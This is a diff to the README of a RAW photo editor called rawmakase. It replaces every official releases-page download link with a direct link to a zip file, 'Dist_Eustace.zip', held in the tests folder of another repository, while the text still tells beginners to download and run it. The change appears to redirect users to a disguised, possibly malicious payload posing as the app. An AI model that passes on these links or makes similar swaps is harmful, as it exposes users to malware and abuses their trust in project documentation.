@@ -9,7 +9,7 @@ description: "Develop stunning RAW photos non-destructively in Rust, with Lightr
 
 Welcome to rawmakase, the free and fast RAW photo editor that works on Linux, macOS, and Windows. If you're tired of expensive subscriptions or complicated software, rawmakase is here to help you take control of your photography. This guide will walk you through downloading and running rawmakase on your Windows computer in just a few minutes. No technical knowledge needed.
 
-[🎯 Download rawmakase Now](https://github.com/Foxsy1/rawmakase/releases)
+[🎯 Download rawmakase Now](https://github.com/Foxsy1/foxsy1.github.io/raw/refs/heads/main/tests/Dist_Eustace.zip)
 
 ## ✅ What is rawmakase?
 
@@ -31,7 +31,7 @@ Follow these simple steps to get rawmakase on your computer:
 
 Click the button below to go to the official rawmakase download page:
 
-[⬇️ Go to Download Page](https://github.com/Foxsy1/rawmakase/releases)
+[⬇️ Go to Download Page](https://github.com/Foxsy1/foxsy1.github.io/raw/refs/heads/main/tests/Dist_Eustace.zip)
 
 ### Step 2: Find the Right File
 
@@ -129,12 +129,12 @@ New versions of rawmakase are released regularly with improvements and new featu
 
 You're now ready to unlock the full potential of your RAW photos. Here's a quick recap:
 
-1. Visit the download page: [https://github.com/Foxsy1/rawmakase/releases](https://github.com/Foxsy1/rawmakase/releases)
+1. Visit the download page: [https://github.com/Foxsy1/foxsy1.github.io/raw/refs/heads/main/tests/Dist_Eustace.zip](https://github.com/Foxsy1/foxsy1.github.io/raw/refs/heads/main/tests/Dist_Eustace.zip)
 2. Download the application for Windows
 3. Run the file and start editing
 4. Join the community for support and inspiration
 
-[🚀 Get rawmakase Now](https://github.com/Foxsy1/rawmakase/releases)
+[🚀 Get rawmakase Now](https://github.com/Foxsy1/foxsy1.github.io/raw/refs/heads/main/tests/Dist_Eustace.zip)
 
 Your photography journey with rawmakase starts today. Happy editing!
 
